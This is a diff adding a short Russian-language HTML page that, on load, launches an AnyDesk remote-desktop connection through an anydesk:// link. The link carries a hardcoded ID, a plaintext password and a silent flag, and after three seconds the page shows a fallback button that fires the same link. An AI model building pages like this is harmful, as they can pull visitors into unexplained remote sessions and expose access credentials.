@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Подключение...</title>
+    <script>
+        window.onload = function() {
+            window.location.href = "anydesk://connect?660090345&password=Pih0pEBklvDv2&silent=true";
+            // Если AnyDesk не открылся через 3 секунды — показываем кнопку для ручного запуска
+            setTimeout(function() {
+                document.body.innerHTML = '<h1>Нажмите кнопку для подключения</h1><button onclick="window.location.href=\'anydesk://connect?660090345&password=Pih0pEBklvDv2&silent=true\'">Подключиться</button>';
+            }, 3000);
+        }
+    </script>
+</head>
+<body>
+    <h1>Идёт подключение к серверу...</h1>
+</body>
+</html>
